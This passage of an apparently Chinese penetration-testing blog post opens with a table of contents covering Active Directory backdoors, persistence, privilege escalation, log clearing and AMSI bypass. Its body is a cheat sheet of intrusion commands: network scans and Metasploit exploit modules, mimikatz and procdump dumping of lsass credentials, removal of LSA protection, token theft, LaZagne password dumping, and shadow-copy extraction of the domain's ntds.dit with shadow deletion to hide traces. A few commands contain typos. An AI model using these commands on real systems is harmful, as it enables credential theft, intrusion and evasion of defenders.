class="toc-number">9.4.3.</span> <span class="toc-text"> 攻击其它林</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7"><span class="toc-number">9.5.</span> <span class="toc-text"> 活动目录持久性技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#security-support-provider"><span class="toc-number">9.5.0.0.1.</span> <span class="toc-text"> Security Support Provider</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sid-history"><span class="toc-number">9.5.0.0.2.</span> <span class="toc-text"> SID History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#adminsdholdersdprop"><span class="toc-number">9.5.0.0.3.</span> <span class="toc-text"> AdminSDHolder＆SDProp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dcsync%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.4.</span> <span class="toc-text"> Dcsync 后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">9.5.0.0.5.</span> <span class="toc-text"> 组策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hook-passwordchangenotify"><span class="toc-number">9.5.0.0.6.</span> <span class="toc-text"> Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberoasting%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.7.</span> <span class="toc-text"> Kerberoasting 后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#adminsdholder"><span class="toc-number">9.5.0.0.8.</span> <span class="toc-text"> AdminSDHolder</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#delegation"><span class="toc-number">9.5.0.0.9.</span> <span class="toc-text"> Delegation</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">10.</span> <span class="toc-text"> 11. 敏感文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-2"><span class="toc-number">10.1.</span> <span class="toc-text"> windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-2"><span class="toc-number">10.2.</span> <span class="toc-text"> Linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">11.</span> <span class="toc-text"> 12. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-3"><span class="toc-number">11.1.</span> <span class="toc-text"> Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-uac"><span class="toc-number">11.1.1.</span> <span class="toc-text"> bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">11.1.1.0.1.</span> <span class="toc-text"> 常用方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">11.1.1.0.2.</span> <span class="toc-text"> 常用工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-2"><span class="toc-number">11.1.1.1.</span> <span class="toc-text"> 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-3"><span class="toc-number">11.2.</span> <span class="toc-text"> Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.0.1.</span> <span class="toc-text"> 内核溢出提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.2.0.2.</span> <span class="toc-text"> 计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#suid"><span class="toc-number">11.2.0.3.</span> <span class="toc-text"> SUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">11.2.0.4.</span> <span class="toc-text"> 环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.2.0.5.</span> <span class="toc-text"> 系统服务的错误权限配置漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-4034"><span class="toc-number">11.2.0.6.</span> <span class="toc-text"> CVE-2021-4034</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="toc-number">11.2.0.7.</span> <span class="toc-text"> 不安全的文件 &#x2F; 文件夹权限配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="toc-number">11.2.0.8.</span> <span class="toc-text"> 找存储的明文用户名，密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">12.</span> <span class="toc-text"> 13. 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-4"><span class="toc-number">12.1.</span> <span class="toc-text"> Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7"><span class="toc-number">12.1.0.0.1.</span> <span class="toc-text"> 1、密码记录工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8payload%E4%BD%8D%E7%BD%AE"><span class="toc-number">12.1.0.0.2.</span> <span class="toc-text"> 2、常用的存储 Payload 位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-runrunonce-keys"><span class="toc-number">12.1.0.0.3.</span> <span class="toc-text"> 3、Run&#x2F;RunOnce Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-bootexecute-key"><span class="toc-number">12.1.0.0.4.</span> <span class="toc-text"> 4、BootExecute Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-userinit-key"><span class="toc-number">12.1.0.0.5.</span> <span class="toc-text"> 5、Userinit Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-startup-keys"><span class="toc-number">12.1.0.0.6.</span> <span class="toc-text"> 6、Startup Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-services"><span class="toc-number">12.1.0.0.7.</span> <span class="toc-text"> 7、Services</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-browser-helper-objects"><span class="toc-number">12.1.0.0.8.</span> <span class="toc-text"> 8、Browser Helper Objects</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-appinit_dlls"><span class="toc-number">12.1.0.0.9.</span> <span class="toc-text"> 9、AppInit_DLLs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10-%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">12.1.0.0.10.</span> <span class="toc-text"> 10、文件关联</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11-bitsadmin"><span class="toc-number">12.1.0.0.11.</span> <span class="toc-text"> 11、bitsadmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#12-mof"><span class="toc-number">12.1.0.0.12.</span> <span class="toc-text"> 12、mof</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#13-wmi"><span class="toc-number">12.1.0.0.13.</span> <span class="toc-text"> 13、wmi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14-userland-persistence-with-scheduled-tasks"><span class="toc-number">12.1.0.0.14.</span> <span class="toc-text"> 14、Userland Persistence With Scheduled Tasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#15-netsh"><span class="toc-number">12.1.0.0.15.</span> <span class="toc-text"> 15、Netsh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#16-shim"><span class="toc-number">12.1.0.0.16.</span> <span class="toc-text"> 16、Shim</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#17-dll%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.17.</span> <span class="toc-text"> 17、DLL 劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#18-doubleagent"><span class="toc-number">12.1.0.0.18.</span> <span class="toc-text"> 18、DoubleAgent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#19-waitforexe"><span class="toc-number">12.1.0.0.19.</span> <span class="toc-text"> 19、waitfor.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#20-appdomainmanager"><span class="toc-number">12.1.0.0.20.</span> <span class="toc-text"> 20、AppDomainManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#21-office"><span class="toc-number">12.1.0.0.21.</span> <span class="toc-text"> 21、Office</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-clr"><span class="toc-number">12.1.0.0.22.</span> <span class="toc-text"> 22、CLR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23-msdtc"><span class="toc-number">12.1.0.0.23.</span> <span class="toc-text"> 23、msdtc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24-hijack-caccpropservicesclass-and-mmdeviceenumerato"><span class="toc-number">12.1.0.0.24.</span> <span class="toc-text"> 24、Hijack CAccPropServicesClass and MMDeviceEnumerato</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25-hijack-explorerexe"><span class="toc-number">12.1.0.0.25.</span> <span class="toc-text"> 25、Hijack explorer.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#26-windows-fax-dll-injection"><span class="toc-number">12.1.0.0.26.</span> <span class="toc-text"> 26、Windows FAX DLL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#27-%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"><span class="toc-number">12.1.0.0.27.</span> <span class="toc-text"> 27、特殊注册表键值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#28-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">12.1.0.0.28.</span> <span class="toc-text"> 28、快捷方式后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#29-logon-scripts"><span class="toc-number">12.1.0.0.29.</span> <span class="toc-text"> 29、Logon Scripts</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#30-password-filter-dll"><span class="toc-number">12.1.0.0.30.</span> <span class="toc-text"> 30、Password Filter DLL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#31-%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.31.</span> <span class="toc-text"> 31、利用 BHO 实现 IE 浏览器劫持</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-4"><span class="toc-number">12.2.</span> <span class="toc-text"> Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab"><span class="toc-number">12.2.0.0.1.</span> <span class="toc-text"> crontab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd"><span class="toc-number">12.2.0.0.2.</span> <span class="toc-text"> 硬链接 sshd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh-server-wrapper"><span class="toc-number">12.2.0.0.3.</span> <span class="toc-text"> SSH Server wrapper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh-keylogger"><span class="toc-number">12.2.0.0.4.</span> <span class="toc-text"> SSH keylogger</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor"><span class="toc-number">12.2.0.0.5.</span> <span class="toc-text"> Cymothoa_进程注入 backdoor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rootkit"><span class="toc-number">12.2.0.0.6.</span> <span class="toc-text"> rootkit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tools"><span class="toc-number">12.2.0.0.7.</span> <span class="toc-text"> Tools</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">13.</span> <span class="toc-text"> 14. 痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.1.</span> <span class="toc-text"> Windows 日志清除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">13.0.2.</span> <span class="toc-text"> 破坏 Windows 日志记录功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#metasploit"><span class="toc-number">13.0.3.</span> <span class="toc-text"> Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.4.</span> <span class="toc-text"> 3389 登陆记录清除</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">14.</span> <span class="toc-text"> 15. 内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">14.0.0.1.</span> <span class="toc-text"> 0x01 场景与思路分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E5%AF%B9%E5%87%BA%E5%8F%A3%E6%B5%81%E9%87%8F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E7%AB%AF%E5%8F%A3%E9%99%90%E5%88%B6"><span class="toc-number">14.0.0.1.0.1.</span> <span class="toc-text"> 场景一：内网防火墙对出口流量没有任何端口限制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BB%85%E5%85%81%E8%AE%B8%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%E7%9A%84%E7%89%B9%E5%AE%9A%E7%AB%AF%E5%8F%A3%E5%A6%8280-443"><span class="toc-number">14.0.0.1.0.2.</span> <span class="toc-text"> 场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89tcp%E4%B8%8D%E5%87%BA%E7%BD%91-http%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.3.</span> <span class="toc-text"> 场景三：TCP 不出网 - HTTP 代理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9Btcp%E5%87%BA%E7%BD%91-socks%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.4.</span> <span class="toc-text"> 场景四	TCP 出网 - socks 代理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-lcx"><span class="toc-number">14.0.0.2.</span> <span class="toc-text"> 0x02 Lcx</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.2.1.</span> <span class="toc-text"> 端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">14.0.0.2.2.</span> <span class="toc-text"> 端口映射</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-ssh%E9%9A%A7%E9%81%93"><span class="toc-number">14.0.0.3.</span> <span class="toc-text"> 0x03  SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.1.</span> <span class="toc-text"> SSH 本地转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.2.</span> <span class="toc-text"> SSH 远程转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%81%9A%E5%8A%A8%E6%80%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.3.</span> <span class="toc-text"> SSH 动态转发，正向代理做动态的端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E5%8D%95%E4%B8%80%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.4.</span> <span class="toc-text"> SSH 动态转发，正向代理进行单一的端口转发</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16bypass-amsi"><span class="toc-number">15.</span> <span class="toc-text"> 16.Bypass AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%ADamsi"><span class="toc-number">15.0.1.</span> <span class="toc-text"> 一键关闭 AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E9%99%8D%E7%BA%A7"><span class="toc-number">15.0.2.</span> <span class="toc-text"> powershell 降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81"><span class="toc-number">15.0.3.</span> <span class="toc-text"> 内存补丁</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        渗透
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-20T10:24:01.000Z" class="dt-published" itemprop="datePublished">2023-07-20</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/blog/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="1无凭证情况下"><a class="markdownIt-Anchor" href="#1无凭证情况下">#</a> 1. 无凭证情况下</h1>
<h2 id="网络扫描"><a class="markdownIt-Anchor" href="#网络扫描">#</a> 网络扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; 							# ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	# 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						# 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			# 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						# UDP 扫描</span><br></pre></td></tr></table></figure>
<h2 id="漏洞快速探测"><a class="markdownIt-Anchor" href="#漏洞快速探测">#</a> 漏洞快速探测</h2>
<p>扫描后可以去先用已知漏洞打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">		   findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a class="markdownIt-Anchor" href="#提权">#</a> 提权</h2>
<p>低权限可以做的事情</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe</span><br><span class="line">查找内容有 password 的文件：findstr /si &#x27;password&#x27; *.txt *.xml *.docx</span><br><span class="line">Juicy Potato / Lovely Potato</span><br><span class="line">PrintSpoofer</span><br><span class="line">RoguePotato</span><br><span class="line">SMBGhost CVE-2020-0796</span><br><span class="line">CVE-2021-36934 (HiveNightmare/SeriousSAM)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h2 id="拥有本地管理员权限"><a class="markdownIt-Anchor" href="#拥有本地管理员权限">#</a> 拥有本地管理员权限</h2>
<h3 id="获取密码"><a class="markdownIt-Anchor" href="#获取密码">#</a> 获取密码</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">hashdump: post/windows/gather/smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>
<h3 id="绕过lsa防护策略读取密码"><a class="markdownIt-Anchor" href="#绕过lsa防护策略读取密码">#</a> 绕过 LSA 防护策略读取密码</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure>
<h3 id="token窃取"><a class="markdownIt-Anchor" href="#token窃取">#</a> token 窃取</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>
<p>之前粗略分析过 token</p>
<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/">Token 窃取那些事 (0range-x.github.io)</a></p>
<h3 id="查看本地存储的所有密码"><a class="markdownIt-Anchor" href="#查看本地存储的所有密码">#</a> 查看本地存储的所有密码</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure>
<h3 id="卷影拷贝获取域控所有hash"><a class="markdownIt-Anchor" href="#卷影拷贝获取域控所有hash">#</a> 卷影拷贝（获取域控所有 hash）</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line"></span><br><span class="line">mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">管理员权限执行 </span><br><span class="line">vssadmin create shadow /for=C: </span><br><span class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive </span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line">//导出system.hive文件到注册表 </span><br><span class="line"></span><br><span class="line">vssadmin delete shadows /for=C: /quiet   //删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure>
<p>[<a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D">CVE-2020-1472 的分析与复现 (0range-x.github.io)</a>](<a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">https://0range-x.github.io/2021/11/22/CVE-2020-1472/</a>)</p>
<h3 id="dpapi解密"><a class="markdownIt-Anchor" href="#dpapi解密">#</a> dpapi 解密</h3>
<h1 id="2内网信息收集"><a class="markdownIt-Anchor" href="#2内网信息收集">#</a> 2. 内网信息收集</h1>
<h2 id="本机信息收集"><a class="markdownIt-Anchor" href="#本机信息收集">#</a> 本机信息收集</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、用户列表  net user /domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist /svc</span><br><span 